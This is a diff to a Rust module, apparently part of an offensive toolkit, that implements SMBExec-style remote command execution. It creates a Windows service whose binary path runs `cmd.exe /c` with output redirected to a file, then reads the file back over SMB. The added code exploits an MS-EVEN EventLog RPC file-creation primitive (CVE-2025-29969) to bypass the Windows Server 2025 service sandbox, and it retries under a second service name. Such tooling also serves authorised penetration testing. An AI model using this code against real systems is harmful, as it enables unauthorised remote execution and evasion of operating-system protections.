@@ -3,6 +3,13 @@
 //! Unlike PSExec, this does NOT deploy a binary.
 //! Instead, it creates a service whose binary path is `cmd.exe /C <command>`,
 //! redirecting output to a file on the admin share, then reads it back.
+//!
+//! # WS2025 Service Sandbox Bypass
+//!
+//! On Windows Server 2025+, the service sandbox prevents cmd.exe from creating
+//! output files. This module uses the MS-EVEN EventLog RPC CreateFile primitive
+//! (CVE-2025-29969) to pre-create the output file as SYSTEM before the service
+//! runs. The sandbox allows writing to pre-existing files, so file redirect works.
 
 use crate::error::Result;
 use crate::proto::smb::SmbSession;
@@ -85,6 +92,10 @@ pub async fn exec_command(session: &SmbSession, command: &str) -> Result<SmbExec
 }
 
 /// Execute with custom configuration
+///
+/// On WS2025+, the service sandbox blocks cmd.exe from creating output files.
+/// This function tries MS-EVEN RPC (CVE-2025-29969) to pre-create the file
+/// as SYSTEM before running the service, then falls back to standard flow.
 pub async fn execute(
     session: &SmbSession,
     command: &str,
@@ -97,30 +108,61 @@ pub async fn execute(
     debug!("SMBExec: Command: {}", command);
 
     // Build the service binary path that redirects output to a file.
-    // Use a local path (C:\Windows\Temp\...) instead of UNC (\\127.0.0.1\C$\...)
-    // because the loopback admin share may not be accessible from the service context.
-    // C$ maps to C:\ so the local path is C:\Windows\Temp\{output_path_file}.
     let output_local_path = format!("C:\\{}", config.output_path);
     let escaped_command = escape_cmd_metacharacters(command);
-    // Use explicit cmd.exe path instead of %COMSPEC% to avoid WS2025
-    // environment variable resolution issues in the service context.
     let binary_path = format!(
         "cmd.exe /Q /c {} > {} 2>&1",
         escaped_command, output_local_path
     );
 
-    // Use PSExec-style SCM interaction to create and start the service
+    // Step 1: Pre-create output file via MS-EVEN RPC (bypasses WS2025 sandbox).
+    // The EventLog service (running as SYSTEM) creates the file; then the
+    // sandboxed cmd.exe can open the existing file for write.
+    let mut even_succeeded = false;
+    if let Err(e) = crate::proto::even::create_smbexec_output_file(session, &config.output_path).await
+    {
+        debug!("SMBExec: MS-EVEN pre-create failed (non-critical): {e}");
+    } else {
+        debug!("SMBExec: MS-EVEN pre-created output file as SYSTEM");
+        even_succeeded = true;
+    }
+
+    // Step 2: Create and start the service with output redirect
     let psexec_config = psexec::PsExecConfig {
         service_name: config.service_name.clone(),
         display_name: config.service_name.clone(),
-        command: binary_path,
-        cleanup: false, // We handle cleanup ourselves
+        command: binary_path.clone(),
+        cleanup: false,
     };
 
     let exec_result = psexec::execute(session, &psexec_config).await;
 
-    // Wait for command to complete with backoff retry
-    let output = poll_output(session, config).await;
+    // Step 3: Wait for command and poll for output
+    let mut output = poll_output(session, config).await;
+
+    // Step 4: If no output and MS-EVEN wasn't tried (or failed on first attempt),
+    // try re-running with a pre-created file via MS-EVEN to bypass sandbox.
+    if output.is_empty() && !even_succeeded {
+        warn!("SMBExec: No output from service (sandbox may block file creation)");
+        warn!("SMBExec: Retrying with MS-EVEN pre-created output file...");
+
+        match crate::proto::even::create_smbexec_output_file(session, &config.output_path).await {
+            Ok(()) => {
+                info!("SMBExec: Re-running service with pre-created output file...");
+                let psexec_config2 = psexec::PsExecConfig {
+                    service_name: format!("{}_", config.service_name),
+                    display_name: config.service_name.clone(),
+                    command: binary_path.clone(),
+                    cleanup: false,
+                };
+                let _ = psexec::execute(session, &psexec_config2).await;
+                output = poll_output(session, config).await;
+            }
+            Err(e) => {
+                warn!("SMBExec: MS-EVEN fallback also failed: {e}");
+            }
+        }
+    }
 
     match exec_result {
         Ok(r) => Ok(SmbExecResult {
@@ -130,7 +172,6 @@ pub async fn execute(
             output,
         }),
         Err(e) => {
-            // Even if service ops failed, we might still have output
             warn!("SMBExec: Service operation error: {e}");
             Ok(SmbExecResult {
                 target: session.target.clone(),
